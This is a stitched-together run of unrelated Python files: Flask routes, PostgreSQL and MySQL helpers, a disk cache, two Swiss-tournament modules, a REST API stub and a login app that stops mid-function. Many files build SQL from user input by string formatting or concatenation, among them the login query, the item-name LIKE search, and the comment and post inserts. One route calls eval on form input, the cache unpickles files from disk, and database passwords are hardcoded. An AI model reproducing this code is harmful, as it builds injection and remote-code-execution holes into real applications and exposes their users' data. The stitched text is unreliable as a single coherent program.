                        if r_id in auxiliary_dict[pkg]['repo_id'] and \
                                (provided_repo_ids is None or r_id in provided_repo_ids):
                            # Some pkgs don't have associated errata (eg, original-repo-content)
                            if upd_pkg_id in pkg_id2errata_id:
                                errata_ids = pkg_id2errata_id[upd_pkg_id]
                                for e_id in errata_ids:
                                    # check current errata in the same repo with update pkg
                                    if r_id in errata_id2repo_id[e_id]:
                                        e_name = id2errata_dict[e_id]
                                        r_name = repoinfo_dict[r_id]['name']

                                        answer[pkg].append({
                                            'package': pkg_id2full_name[upd_pkg_id],
                                            'erratum': e_name,
                                            'repository': r_name})
        response = {
            'update_list': answer,
        }

        if provided_repo_ids is not None:
            response.update({'repository_list': provided_repo_names})

        return response


from flask import render_template, request, redirect, url_for
from flask_login import login_user, login_required, logout_user, current_user

from application import app, db
from application.help import getArticlesWithCondition                    
from application.articles.models import Article
from application.articles.forms import ArticleForm
from application.help import getEditorOptions, getIssueOptions, getPeopleOptions
from application.issues.models import Issue
from application.issues.forms import IssueForm

from sqlalchemy.sql import text

@app.route("/issues/", methods=["GET"])
def issues_index():
    query = text(
        "SELECT issue.id, issue.name FROM issue ORDER BY issue.name"
    )
    issues = db.engine.execute(query)
    return render_template("/issues/list.html", current_user=current_user, issues = issues)

@app.route("/<issue>/articles/", methods=["GET"])
def articles_in_issue(issue):
    try:
        issueid = Issue.query.filter_by(name=issue).first().id
    except:
        return redirect(url_for("error404"))

    return render_template("articles/editor_view.html", 
        planned_articles = Article.get_all_planned_articles(int(issueid)),
        draft_articles = Article.get_all_draft_articles(int(issueid)),
        written_articles = Article.get_all_written_articles(int(issueid)),
        edited_articles = Article.get_all_edited_articles(int(issueid)),
        finished_articles = Article.get_all_finished_articles(int(issueid)))

@app.route("/<issue>/articles/new", methods=["GET"])
@login_required
def articles_create_for_issue(issue):
    try:
        issueid = Issue.query.filter_by(name=issue).first().id
    except:
        return redirect(url_for("error404"))
    
    if not current_user.editor:
        return redirect(url_for("error403"))

    form = ArticleForm()
    form.writer.choices = getPeopleOptions()
    form.editorInCharge.choices = getEditorOptions()
    form.issue.choices = getIssueOptions()
    form.issue.data = issueid

    return render_template("/articles/new.html", form=form)

@app.route("/issues/new/", methods=["GET", "POST"])
@login_required
def issues_create():
    if request.method == "GET":
        form = IssueForm()
        return render_template("/issues/new.html", form=form)
    
    if not current_user.editor:
        return redirect(url_for("error401"))

    form = IssueForm(request.form)

    if not form.validate():
        return render_template("issues/new.html", form = form)
    
    issue = Issue(form.name.data)
    db.session.add(issue)
    db.session.commit()

    return redirect(url_for("issues_index"))

@app.route("/<issue_id>/delete", methods=["POST"])
@login_required
def issues_delete(issue_id):
    if not current_user.is_admin:
        return redirect(url_for("error401"))

    issue_to_delete = Issue.query.get(issue_id)
    if not issue_to_delete:
        return redirect(url_for("error404"))

    articles_in_issue = Article.query.filter_by(issue=issue_id)

    # related articles are not distroyed but unassigned
    for article in articles_in_issue:
        article.set_issue(0)

    db.session.delete(issue_to_delete)
    db.session.commit()

    return redirect(url_for("issues_index"))


from flask import redirect, render_template, request, url_for
from flask_login import login_required, current_user

from application import app, db
from application.auth.models import User
from application.people.models import Name
from application.people.forms import NameForm

@app.route("/people/", methods=["GET"])
def people_index():
    return render_template("/people/list.html", people = get_people())

@app.route("/people/new/")
@login_required
def people_form():
    if not current_user.editor:
        return redirect(url_for("error403"))

    form = NameForm()
    return render_template("/people/new.html", form = form)

@app.route("/people/", methods=["POST"])
@login_required
def people_create():
    if not current_user.editor:
        return redirect(url_for("error403"))

    form = NameForm(request.form)

    if not form.validate():
        return render_template("people/new.html", form = form)

    u = User(form.name.data, "", "")
    db.session().add(u)
    db.session().commit()
    u.add_name(form.name.data)

    return redirect(url_for("people_index"))

@app.route("/people/<user_id>/edit", methods=["GET"])
@login_required
def person_edit(user_id):
    form = NameForm()
    name = ""
    username = ""
    prsn = User.query.filter_by(id = user_id).first()

    if prsn.username != "":
        username = prsn.username

    name = prsn.name

    names = list(map(lambda name: {"name":name.name, "id":name.id}, prsn.names))
    person = {"id": user_id, "name": name, "username": username, "names": names}

    return render_template("/people/edit.html", person = person, form = form)

@app.route("/people/<user_id>/delete_name/<name_id>", methods=["POST"])
@login_required
def delete_name(name_id, user_id):
    if not current_user.editor:
        return redirect(url_for("error403"))

    name_to_delete = Name.query.filter_by(id = name_id).first()
    db.session.delete(name_to_delete)
    db.session.commit()
    return redirect(url_for("person_edit", user_id=user_id))

@app.route("/people/<user_id>", methods=["POST"])
@login_required
def names_create(user_id):
    if not current_user.editor:
        return redirect(url_for("error403"))

    form = NameForm(request.form)

    if not form.validate():
        return render_template("/people/edit.html", person=eval(request.form["person"]), form = form)

    n = Name(form.name.data, user_id)

    db.session().add(n)
    db.session().commit()

    return redirect(url_for("person_edit", user_id=user_id))

@app.route("/people/<user_id>/", methods=["GET"])
def show_tasks(user_id):
    user = User.query.get(int(user_id))
    if not user:
        return redirect(url_for("error404"))
    
    name = user.name

    articles_writing = user.get_articles_writing()                    
    articles_editing = user.get_articles_editing()                    

    return render_template("people/tasks.html",
        articles_writing = articles_writing,
        articles_editing = articles_editing,
        posessive_form = "" + name + "'s",
        system_name = user.name,
        person_is = name + " is")

def get_people():
    people = []
    ppl = User.query.all()
    for person in ppl:
        username = ""
        name = person.name
        if person.username:
            username = person.username
        names = Name.query.filter_by(user_id=person.id)
        people.append({'id': person.id, 'username': username, 'name': name, 'names': names})
    return people

# "Database code" for the DB Forum.

import psycopg2

DBNAME = "forum"

def get_posts():
  """Return all posts from the 'database', most recent first."""
  db = psycopg2.connect(database=DBNAME)
  c = db.cursor()
  c.execute("select content,time from posts order by time desc")
  return c.fetchall()
  db.close()

def add_post(content):
  """Add a post to the 'database' with the current timestamp."""
  db = psycopg2.connect(database=DBNAME)
  c = db.cursor()
  c.execute("insert into posts values('%s')" % content)                    
  db.commit()
  db.close()


#!/usr/bin/env python
# -*- coding: utf-8 -*-
# DiskCache.py

import  os
import  sys
import  zlib
import  time
import  logging as logger
import  urlparse
from  datetime import  datetime, timedelta
try:
    import cPickle as pickle
except ImportError:
    logger.info ("cPickle module not available")
    import pickle
sys.setrecursionlimit(10000)

class  DiskCache:
    """
    Dictionary interface that stores cached
    values in the file system rather than in memory.
    The file path is formed from an md5 hash of the key.
    """

    def  __init__ (self, cache_dir='cache', expires=timedelta(days=30), compress=True):                    
        """
        cache_dir: the root level folder for the cache
        expires: timedelta of amount of time before a cache entry is considered expired
        compress: whether to compress data in the cache
        """
        self.cache_dir = cache_dir
        self.expires = expires
        self.compress = compress


    def  __getitem__ (self, url):
        """Load data from disk for this URL
        """
        path = self.url_to_path (url)
        if  os.path.exists (path):
            with open (path, 'rb') as fp:
                data = fp.read()
                if  self.compress:
                    logger.info ('Loading...')
                    data = zlib.decompress (data)
                result = pickle.loads (data)
                #if  self.has_expired (timestamp):
                #    self.__delitem__ (url)
                #    raise  KeyError (url + ' has expired')
                return  result
        else:
            # URL has not yet been cached
            raise KeyError(url + ' does not exist')


    def  __setitem__ (self, url, result):
        """Save data to disk for this url
        """
        path = self.url_to_path (url)
        folder = os.path.dirname (path)
        if not os.path.exists (folder):
            os.makedirs (folder)

        data = pickle.dumps (result) # saves the current timestamp in the pickled data
        if  self.compress:
            logger.info ('Saving...')
            data = zlib.compress (data)
        with  open(path, 'wb') as fp:
            fp.write (data)


    def  __delitem__ (self, url):
        """Remove the value at this key and any empty parent sub-directories
        """
        path = self.url_to_path (url)
        try:
            os.remove (path)
            os.removedirs (os.path.dirname(path))
        except OSError:
            pass


    def  url_to_path (self, url):
        """Create file system path for this URL
        """
        components = urlparse.urlsplit (url)
        # when empty path set to /index.html
        path = components.path
        if not  path:
            path = '/index.html'
        elif  path.endswith('/'):
            path += 'index.html'
        filename = components.netloc + path + components.query
        # replace invalid characters
        # filename = re.sub('[^/0-9a-zA-Z\-.,;_ ]', '_', filename)
        # restrict maximum number of characters
        filename = '/'.join(segment[:255] for segment in filename.split('/'))
        return  os.path.join(self.cache_dir, filename)


    def  has_expired (self, timestamp):
        """Return whether this timestamp has expired
        """
        return  datetime.utcnow() > timestamp + self.expires


    def  clear (self):
        """Remove all the cached values
        """
        if  os.path.exists (self.cache_dir):
            shutil.rmtree (self.cache_dir)

from modules import sql


class Comment:
    def __init__(self,conn):
        self.conn=conn;
    
    def getCommentsByUser(self,userid):
        sqlText="select comment from comments order by date desc where userid=%d"%(userid)                    
        result=sql.queryDB(self.conn,sqlText)                    
        return result;
    
    def getCommentsByPostid(self,postid,userid):
        sqlText="select (select Count(*) from comment_like where comments.commentid = comment_like.commentid) as like,(select Count(*) from comment_like where comments.commentid = comment_like.commentid and comment_like.userid=%d) as flag,commentid,name,comment from users,comments where users.userid=comments.userid and postid=%d order by date desc;"%(userid,postid)                    
        result=sql.queryDB(self.conn,sqlText)                    
        return result;

    def getCommentsLike(self,commentid):
        sqlText="select userid from comment_like where commentid=%d"%(commentid)                    
        result=sql.queryDB(self.conn,sqlText)                    
        return result;
	
    def insertData(self,comment,userid,postid):
        sqlText="insert into comments(comment,userid,date,postid) values('%s',%d,current_timestamp(0),%d);"%(comment,userid,postid)                    
        result=sql.insertDB(self.conn,sqlText)                    
        return result;

    def deleteComment(self,commentid):
        sqlText="delete from comments where commentid=%d"%(commentid)                    
        result=sql.deleteDB(self.conn,sqlText)                    
        return result;

    def likeComments(self,commentid,userid):
        sqlText="insert into comment_like values(%d,%d);"%(userid,commentid)                    
        result=sql.insertDB(self.conn,sqlText)                    
        return result;

    def dislikeComments(self,commentid,userid):
        sqlText="delete from comment_like where commentid=%d and userid=%d;"%(commentid,userid)                    
        result=sql.deleteDB(self.conn,sqlText)                    
        return result;




from modules import sql


class Post:
    def __init__(self,conn):
        self.conn=conn;

    def getAllPosts(self,userid):
        sqlText="select users.name,post.comment,post.postid,(select Count(*) from post_like \
                where post.postid = post_like.postid) as like,\
                (select Count(*) from post_like where post.postid =post_like.postid \
                and post_like.userid=%d) as flag from users,post \                    
                where post.userid=users.userid and (post.userid in \
                (select friendid from friends where userid =%d) or post.userid=%d )\                    
                order by post.date desc;"%(userid,userid,userid)                    
        result=sql.queryDB(self.conn,sqlText)                    
        return result;
    
    def getPostsByPostid(self,postid):
        sqlText="select users.name,post.comment from users,post where \
                users.userid=post.userid and post.postid=%d"%(postid)                    
        result=sql.queryDB(self.conn,sqlText)                    
        return result;
    
    def getPostLike(self,postid):
        sqlText="select userid from post_like where postid=%d"%(postid)                    
        result=sql.queryDB(self.conn,sqlText)                    
        return result;

    def likePost(self,postid,userid):
        sqlText="insert into post_like values(%d,%d);"%(postid,userid)                    
        result=sql.insertDB(self.conn,sqlText)                    
        return result;

    def dislikePost(self,postid,userid):
        sqlText="delete from post_like where postid=%d and userid=%d;"%(postid,userid)                    
        result=sql.deleteDB(self.conn,sqlText)                    
        return result;

    def insertData(self,userid,post):
        sqlText="insert into post(userid,date,comment) \
                values(%d,current_timestamp(0),'%s');"%(userid,post);                    
        result=sql.insertDB(self.conn,sqlText)                    
        return result;


    def deletePost(self,postid):
        sqlText="delete from post where post.postid=%d"%(postid)                    
        result=sql.deleteDB(self.conn,sqlText)                    
        return result;

import psycopg2



#ÈìæÊé•Êï∞ÊçÆÂ∫ì
def connectDB(dbname,uname,psw):
    #conn=psycopg2.connect(database="test",user="lishaomin",password="19931004",host="127.0.0.1",port="5432")
    conn=psycopg2.connect(database=dbname,user=uname,password=psw,host="127.0.0.1",port="5432")
    return conn


#Êü•ËØ¢Êï∞ÊçÆÂ∫ì
def queryDB(conn,sql_select):                    
    print("query data")
    cur=conn.cursor()
    #sql_select="select * from users;"
    cur.execute(sql_select)                    
    rows=cur.fetchall()                    
    #for row in rows:
    #print ("user:%s"%(row[1]))
    return rows                    



#ÊèíÂÖ•Êï∞ÊçÆ
def insertDB(conn,sql_insert):                    
    cur=conn.cursor()
    result=cur.execute(sql_insert)                    
    conn.commit()                    
    print("insert data successfull")                    
    return result                    

#delete data
def deleteDB(conn,sql_delete):                    
    cur=conn.cursor()
    result=cur.execute(sql_delete)                    
    conn.commit()                    
    print("delete data successfull")                    
    return result                    


#update data
def updateDB(conn,sql_update):                    
    cur=conn.cursor()
    result=cur.execute(sql_update)                    
    conn.commit()                    
    print("update data successfull")                    
    return result                    


#ÂÖ≥Èó≠ÈìæÊé•
def closeDB(conn):
    conn.close()





from flask import jsonify, request
from . import api

from run import mysql


@api.route('/items', methods=['GET'])
def list_items():
    sql = '''SELECT id, name_enus from tblDBCItem where auctionable = true;'''
    cursor = mysql.connection.cursor()                    
    cursor.execute(sql)                    
    data = cursor.fetchall()                    

    results = []
    for row in data:
        item = {}
        for tup in zip([column[0] for column in cursor.description], row):
            item[tup[0]] = tup[1]

        results.append(item)

    return jsonify({"items": results})


@api.route('/items/<int:item_id>', methods=['GET'])
def get_item(item_id):
    sql = '''SELECT id, name_enus FROM tblDBCItem WHERE id = {} AND auctionable = true;'''.format(item_id)                    
    cursor = mysql.connection.cursor()                    
    cursor.execute(sql)                    
    data = cursor.fetchone()

    if data:
        item = {}
        for tup in zip([column[0] for column in cursor.description], data):
            item[tup[0]] = tup[1]
    else:
        return jsonify({"error": "item not found"}), 404

    return jsonify(item)


@api.route('/item/', methods=['GET'])
def resolve_item_name():
    item_name = request.args.get('name')                    
    sql = '''SELECT id, name_enus FROM `tblDBCItem` WHERE name_enus LIKE "%{}%" '''.format(item_name)                    
    cursor = mysql.connection.cursor()                    
    cursor.execute(sql)                    
    data = cursor.fetchall()                    

    if data:
        results = []
        for row in data:
            item = {}
            for tup in zip([column[0] for column in cursor.description], row):
                item[tup[0]] = tup[1]

            results.append(item)
    else:
        return jsonify({"error": "item not found"}), 404

    return jsonify({"items": results})

#!/usr/bin/env python
#
# tournament.py -- implementation of a Swiss-system tournament
#

import psycopg2
import bleach                    


def connect():
    """Connect to the PostgreSQL database.  Returns a database connection."""
    return psycopg2.connect("dbname=tournament")


def deleteMatches():
    """Remove all the match records from the database."""
    db = connect()
    c = db.cursor()
    c.execute("DELETE FROM matches;")
    db.commit()
    db.close


def deletePlayers():
    """Remove all the player records from the database."""
    deleteMatches()
    db = connect()
    c = db.cursor()
    c.execute("DELETE FROM players;")
    db.commit()
    db.close


def countPlayers():
    """Returns the number of players currently registered."""
    db = connect()
    c = db.cursor()
    c.execute("SELECT COUNT(*) FROM players;")
    rows = c.fetchall()
    db.commit()
    db.close
    return rows[0][0]


def registerPlayer(name):
    """Adds a player to the tournament database.

    The database assigns a unique serial id number for the player.  (This
    should be handled by your SQL database schema, not in your Python code.)

    Args:
      name: the player's full name (need not be unique).
    """

    db = connect()
    c = db.cursor()
    c.execute("INSERT INTO players (name) values (%s)", (bleach.clean(name),))                    
    db.commit()
    db.close()


def playerStandings():
    """Returns a list of the players and their win records, sorted by wins.

    The first entry in the list should be the player in first place, or a player
    tied for first place if there is currently a tie.

    Returns:
      A list of tuples, each of which contains (id, name, wins, matches):
        id: the player's unique id (assigned by the database)
        name: the player's full name (as registered)
        wins: the number of matches the player has won
        matches: the number of matches the player has played
    """
    db = connect()
    c = db.cursor()
    c.execute("SELECT * FROM standings")
    rows = c.fetchall()
    db.close()
    return rows


def reportMatch(winner, loser):
    """Records the outcome of a single match between two players.

    Args:
      winner:  the id number of the player who won
      loser:  the id number of the player who lost
    """
    w = str(winner)
    l = str(loser)
    db = connect()
    c = db.cursor()
    c.execute("INSERT INTO matches values (%s, %s)" % (w, l))
    db.commit()
    db.close()


def swissPairings():
    """Returns a list of pairs of players for the next round of a match.

    Assuming that there are an even number of players registered, each player
    appears exactly once in the pairings.  Each player is paired with another
    player with an equal or nearly-equal win record, that is, a player adjacent
    to him or her in the standings.

    Returns:
      A list of tuples, each of which contains (id1, name1, id2, name2)
        id1: the first player's unique id
        name1: the first player's name
        id2: the second player's unique id
        name2: the second player's name
    """
    db = connect()
    c = db.cursor()
    c.execute("SELECT * FROM pairup;")
    rows = c.fetchall()
    db.close()
    return list(reversed(rows))

#!/usr/bin/env python
#
# tournament.py -- implementation of a Swiss-system tournament
#

import psycopg2


def connect():
    """Connect to the PostgreSQL database.  Returns a database connection."""
    return psycopg2.connect("dbname=tournament")


def deleteMatches():
    """Remove all the match records from the database."""
    db = connect()
    c = db.cursor()
    c.execute("DELETE FROM matches;")
    db.commit()
    db.close


def deletePlayers():
    """Remove all the player records from the database."""
    deleteMatches()
    db = connect()
    c = db.cursor()
    c.execute("DELETE FROM players;")
    db.commit()
    db.close


def countPlayers():
    """Returns the number of players currently registered."""
    db = connect()
    c = db.cursor()
    c.execute("SELECT COUNT(*) FROM players;")
    rows = c.fetchone()
    db.close
    return rows[0]


def registerPlayer(name):
    """Adds a player to the tournament database.

    The database assigns a unique serial id number for the player.  (This
    should be handled by your SQL database schema, not in your Python code.)

    Args:
      name: the player's full name (need not be unique).
    """

    db = connect()
    c = db.cursor()
    # remove any occurance of quotes/apostrophes to prevent sql injection
    safe_n = name = name.translate(None, '\'\"')                    
    query = "INSERT INTO players (name) values ('{name}')".format(name=safe_n)                    
    c.execute(query)                    
    db.commit()
    db.close()


def playerStandings():
    """Returns a list of the players and their win records, sorted by wins.

    The first entry in the list should be the player in first place, or a player
    tied for first place if there is currently a tie.

    Returns:
      A list of tuples, each of which contains (id, name, wins, matches):
        id: the player's unique id (assigned by the database)
        name: the player's full name (as registered)
        wins: the number of matches the player has won
        matches: the number of matches the player has played
    """
    db = connect()
    c = db.cursor()
    c.execute("SELECT * FROM standings")
    rows = c.fetchall()
    db.close()
    return rows


def reportMatch(winner, loser):
    """Records the outcome of a single match between two players.

    Args:
      winner:  the id number of the player who won
      loser:  the id number of the player who lost
    """
    try:
        int(winner)
        int(loser)
    except ValueError:
        raise ValueError(
            "\"winner\" and/or \"loser\" input are not integers.\n"
            "Please use the id number of each player to report match results."
        )
    w = str(winner)
    l = str(loser)
    db = connect()
    c = db.cursor()
    statement = "INSERT INTO matches values ({w}, {l})".format(w=w, l=l)                    
    c.execute(statement)                    
    db.commit()
    db.close()


def swissPairings():
    """Returns a list of pairs of players for the next round of a match.

    Assuming that there are an even number of players registered, each player
    appears exactly once in the pairings.  Each player is paired with another
    player with an equal or nearly-equal win record, that is, a player adjacent
    to him or her in the standings.

    Returns:
      A list of tuples, each of which contains (id1, name1, id2, name2)
        id1: the first player's unique id
        name1: the first player's name
        id2: the second player's unique id
        name2: the second player's name
    """
    db = connect()
    c = db.cursor()
    c.execute("SELECT * FROM pairup;")
    rows = c.fetchall()
    db.close()
    return list(reversed(rows))


import pymysql
import dbconfig

class DBhelper:
    def connect(self,database="crimemap"):
        return pymysql.connect(host='localhost',
                               user=dbconfig.db_user,
                               passwd=dbconfig.db_password,
                               db=database)

    def get_all_inputs(self):
        connection=self.connect()

        try:
            query="SELECT description FROM crimes;"
            with connection.cursor() as cursor:
                cursor.execute(query)                    
            return cursor.fetchall()
        finally:
            connection.close()



    def add_input(self,data):
        connection = self.connect()

        try:
            query = "INSERT INTO crimes (description) VALUES ('{}');".format(data)                    
            with connection.cursor() as cursor:
                cursor.execute(query)                    
                connection.commit()
        finally:
            connection.close()



    def clear_input(self):
        connection = self.connect()

        try:
            query ="DELETE FROM crimes;"
            with connection.cursor() as cursor:
                cursor.execute(query)                    
                connection.commit()
        finally:
            connection.close()


"""A basic Flask app which we can build off of.                    

Handles basic http requests in a simple way.
Only throws 404 errors for now.

Note: Pretty much everything should be changed.
      Also see about adding arguments to the requests.
      Should also change the names of the classes.

      The classes may not need all of these methods.
"""                    

from flask import Flask, jsonify, request
from flask_restful import Resource, Api
from flask_cors import CORS
import db_interac
import utils

app = Flask(__name__)
api = Api(app)
CORS(app)

# Will have to define parser objects for parsing these requests...

# Method stubs for retrieving and updating profile information.
class Profiles(Resource):
    def get(self):
        """Retreives a user profile.                    

        Form Elements
        -------------
        userId : int
            An integer which uniquely identifies this user.

        Returns
        -------
        JSON object containing the users first name, last name, bio and
        up to 25 of thier post recent posts.
        Note
        ----
        Need to do form argument input validation.
        """                    

        """                    
        # Check the request comes from appropriate location.
        if not utils.validate_ip(request.remote_addr)
            return {}, 403
        """                    

        user_id = request.form.get('userId')

        # Case where all user profiles are requested.
        if user_id is None:
            users = db_interac.get_user_profiles()

            # If profile request fails.
            if not users:
                return {}, 500

            response_obj = []

            # Build return object.
            for user in users:
                response_obj.append({
                    'id': user[0],
                    'username': user[1],
                    'firstName': user[2],
                    'lastName': user[3],
                    'bio': user[4]
                })

            return response_obj, 200

        # If specific user profile is requested.
        user_profile = db_interac.get_user_profile(user_id)
        return_obj = {}

        # Check if account creation was successful. If so
        # build return object.
        if (user_profile[0] == False):
            return_obj['error'] = 'error adding profile'
        else:
            return_obj['username']  = user_profile[1]
            return_obj['firstName'] = user_profile[2]
            return_obj['lastName']  = user_profile[3]
            return_obj['bio']       = user_profile[4]
            return_obj['messages']  = user_profile[5]

        return return_obj, 200

    def post(self):
        """Creates a new user profile.                    

        JSON Properties
        ---------------
        username : String
            A unique username which identifies this specific user.
        firstName : String
            The first name of the new user.
        lastName : String
            The last name of the new user.
        password : String
            A password for securty puposes.
        bio : String
            A short personal biography which the user may write.
        institutionCode : String
            A private security code used to confirm that user is a
            Northwood resident.

        Returns
        -------
        A JSON object containing success indicator.
        Note
        ----
        Need to do form argument input validation.
        """                    

        """                    
        # Check the request comes from appropriate location.
        if not utils.validate_ip(request.remote_addr)
            return {}, 403
        """                    

        INSTITUTION_CODE = 'northwood'

        username = request.json.get('username')
        firstname = request.json.get('firstName')
        lastname = request.json.get('lastName')
        password = request.json.get('password')
        bio = request.json.get('bio')
        institution_code = request.json.get('institutionCode')

        if institution_code != INSTITUTION_CODE:
            return {'response': 'incorrect institution code'}, 400

        # Username, first name, and last name must be alphanumeric.
        if not(username.isalnum() or firstname.isalnum() or lastname.isalnum()):
            return {'response': 'incorrect'}, 400

        # Add user profile.
        posted = db_interac.add_user(username, firstname, lastname, bio,
                                     password)

        if posted:
            # Get all current user profiles.
            result = db_interac.get_user_profiles()

            if not result:
                return {}, 500

            response_obj = []

            # Construct return object.
            for user in result:
                response_obj.append({
                    'id': user[0],
                    'username': user[1],
                    'firstName': user[2],
                    'lastName': user[3],
                    'bio': user[4]
                })

            return response_obj, 201
        else:
            return {}, 500

    def put(self):
        """Updates a user profile.                    

        Form Elements
        -------------
        userId : int
            An integer which uniquely identifies this user.
        firstName : string
            Specified change in firstName. If null, no change is made.
        lastName  : string
            Specified change in lastName. If null, no change is made.
        username : string
            Specified change in username. If null, no change is made.
        password : string
            Specified change in password. If null, no change is made.
        bio : string
            Specified change in bio. If null, no change is made.

        Returns
        -------
        JSON object indicating success
        Note
        ----
        Need to do form argument input validation.
        """                    

        """                    
        # Check the request comes from appropriate location.
        if not utils.validate_ip(request.remote_addr)
            return {}, 403
        """                    

        return_obj = False

        user_id   = request.form.get('userId')                    
        firstname = request.form.get('firstName')
        lastname  = request.form.get('lastName')
        username  = request.form.get('username')
        password  = request.form.get('password')
        bio       = request.form.get('bio')

        print(user_id)                    
        print(firstname)                    
        print(lastname)                    

        """                    
        Need to work around nonetype and isalnum()                    

        if fistname == None:                    
            temp1 = ""                    
        if lastname == None:
            temp2 = ""                    
        if username == None:
            temp3 = ""                    

        Then check if temp 1, 2 or 3 are alphanumeric                    
        """                    

        if not (firstname.isalnum() and lastname.isalnum() \                    
                and username.isalnum()):                    
            return {'response': False}, 400

        updated = db_interac.update_profile(user_id, firstname, lastname,
                                            username, password, bio)

        return {'response': updated}, 200 if updated else 400

    # method for deleting all profiles.
    def delete(self):
        deleted = db_interac.delete_users()
        return {}, 204

# Method stubs for retrieving and updating messages.
class Messages(Resource):
    # method
    # (maybe a argument for the number of messages?)

    def get(self):
        """Method to return messages in reverse chronological order.                    

        Form Arguments
        --------------
        page : int
            The 'page' of messages to be returned. Each page is a chunk of up to
            25 messages in reverse chronilogical order.

        Returns
        -------
        messages : list of dict
            A list containing all messages returned in this query.
        Note
        ----
        Need to do form argument input validation.
        """                    

        """                    
        # Check the request comes from appropriate location.
        if not utils.validate_ip(request.remote_addr)
            return {}, 403
        """                    

        page = int(request.args.get('page'))

        response = db_interac.get_messages(page)
        return response, 200

    def post(self):
        """Creates a new message.                    

        Form Arguments
        --------------
        content - str
            The content of this message.
        timePosted - str
            The time at which this message was submitted.
        eventTime - str (optional)
            The event time for this message.
        userId - int
            The ID of the user posting this message.
        username - str
            The username of the user posting this message.
        firstName - str
            The first name of the user posting this message.
        lastName - str
            The last name of the user posting this message.

        Returns
        -------
        response - JSON object indicating success.

        Note
        ----
        Need to do form argument input validation.
        """                    

        """                    
        # Check the request comes from appropriate location.
        if not utils.validate_ip(request.remote_addr)
            return {}, 403
        """                    

        message          = request.form.get('content')
        timeposted       = request.form.get('timePosted')
        eventtime        = request.form.get('eventTime')
        poster_id        = request.form.get('userId')
        poster_username  = request.form.get('username')
        poster_firstname = request.form.get('firstName')
        poster_lastname  = request.form.get('lastName')

        response = db_interac.add_message(message, timeposted, eventtime,
            poster_id, poster_username, poster_firstname, poster_lastname)


        # If message was successfully inserted, gather the first 25 messages.
        if response:
            response = db_interac.get_messages(1)
            return response, 201
        else:
            return {'response' : response}, 500

    def put(self):
        """Updates a message.                    

        Form Arguments
        --------------
        id - string
            The unique identifier for this particular message.
        likes - int
            The number of likes assigned to this comment. If null no new likes
            will be added.
        comment - dict
            New comment to be added to this message. Comment dict must
            contain the keys:
                content   : String containing comment text.
                userId    : Integer representing unique ID of commenter.
                username  : String containing username of commenter.
                firstName : First name of commenter.
                lastName  : Last name of commenter.
                timeposted: Timestamp for when this comment was posted.
            If null, then a new comment will not be created.

        Returns
        -------
        response - dict
            The first 25 messages in the database if successful. Otherwise
            returns error code.
        """                    

        """                    
        # Check the request comes from appropriate location.
        if not utils.validate_ip(request.remote_addr)
            return {}, 403
        """                    

        message_id       = request.json.get('id')
        likes            = request.json.get('likes')
        comment          = request.json.get('comment')
        print(message_id)
        print(likes)
        print(str(comment))

        # If new comment is being added, check that it has required keys.
        if comment is not None:
            if {'content', 'userId', 'username', 'firstname', 'lastname',\
                 'timeposted'}.issubset(comment):
                 return {'response': False}, 400

        response = db_interac.update_message(message_id, likes, comment)

        if response == False:
            return {'response': response}, 400

        return {'response': response}, 200

    def delete(self):
        """Deletes a message or a comment from that message.                    

        Form Arguments
        --------------
        message - int
            The ID of a message to be deleted in the messages table. If comment
            is provided then the message will not be deleted and only the comment
            will be.
        comment - int
            Indicates a comment which is associated with the message which
            will be deleted. If null then the message will be deleted.

        Returns
        -------
        response - dict
            The first 25 messsages in the database.
        """                    

        reponse = delete_from_messages(message, comment)

        return {}, 204

class Auth(Resource):
    def get(self):
        """Authenticates a users identity.                    

        Form Elements
        -------------
        username : String
            A unique username which identifies this specific user.
        password : String
            A password for securty puposes.

        Returns
        -------
        userId : int
            A unique integer code which identifies this user.
        firstName : string
            The first name of this user.
        lastName : string
            The last name of this user.
        Note
        ----
        Need to do form argument input validation.
        """                    

        """                    
        # Check the request comes from appropriate location.
        if not utils.validate_ip(request.remote_addr)
            return {}, 403
        """                    

        username = request.args.get('username')
        password = request.args.get('password')

        if username.isalnum():
            # Authenticate that user exists and has correct information.
            response = db_interac.authenticate(username, password)
            return_obj = {}

            # If first element of response tuple is not False, create
            # and return response object.
            if not response[0]:
                return_obj['error'] = 'user could not be authenticated'
                return return_obj, 401
            else:
                return_obj['userId']   = response[1]
                return_obj['firstName'] = response[2]
                return_obj['lastName']  = response[3]
                return return_obj, 200
        else:
            # Username must be alphnumeric, if not throw error.
            return_obj['error'] = 'username must be alphanumeric'
            return_obj['userId']   = None
            return_obj['firstName'] = None
            return_obj['lastName']  = None
            return return_obj, 401

api.add_resource(Profiles, '/profiles')       # route 1
api.add_resource(Messages, '/messages')       # route 2
api.add_resource(Auth, '/auth')               # route 3

if __name__ == '__main__':
    app.run(debug=True)


from flask import Flask
from flask import session, redirect, url_for, escape, request
from flask import request
from flaskext.mysql import MySQL
from flask import render_template
from flask import Flask,jsonify,json
from string import Template

app = Flask(__name__)

#Required code to connect to mySQL database.
mysql = MySQL()
app = Flask(__name__)
app.config['MYSQL_DATABASE_USER'] = 'root'
app.config['MYSQL_DATABASE_PASSWORD'] = '27'

app.config['MYSQL_DATABASE_DB'] = 'TechTrack'
app.config['MYSQL_DATABASE_HOST'] = 'localhost'
mysql.init_app(app)

#Homepage
#TODO: Replace wtih HTML template when created. 
@app.route('/')
def index():
	if 'username' in session:
		return redirect(url_for('instructions'))
	return redirect(url_for('login'))
	

@app.route('/instructions')
def instructions():
	if 'username' in session:
		return render_template('instructions.html')
	return redirect(url_for('login'))

#Login Page
#Default route only answers to GET requests.
#Can change this by providing methods argument to the route() decorator.
@app.route('/login', methods=['GET', 'POST'])
def login():

	error=None

	#The request was a POST request, i.e. user is submitting form data.
	if request.method == 'POST':

		#Get information from form.
		username = request.form['username']
		password = request.form['password']

		#Check database.
		cursor = mysql.connect().cursor()
		cursor.execute("SELECT * from Users where emailAccount='" + username + "' and password='" + password + "'")                    
		data = cursor.fetchone()

		if data is None:
			error="Username or password is incorrect."
		else:
			#Session.
			session['username'] = request.form['username']
			return redirect(url_for('instructions'))

	return render_template('login.html', error=error)


#Register. 
@app.route('/register', methods=['GET', 'POST'])
def register():
    error = None
    if request.method == 'POST':
        emailAccount = request.form['username']
        password = request.form['password']

        splitDomainName = emailAccount.split('@')[1]
        if (splitDomainName != 'purdue.edu'):
        	error = "You should use a Purdue email."
    		return render_template('createAccount.html', error=error) 
        

        conn = mysql.connect()
        cursor = conn.cursor()
    
        cursor.execute("SELECT * from Users where emailAccount='" + emailAccount + "'")                    
        data = cursor.fetchone()
        if data is None:
            #this password is unique so add it to the database
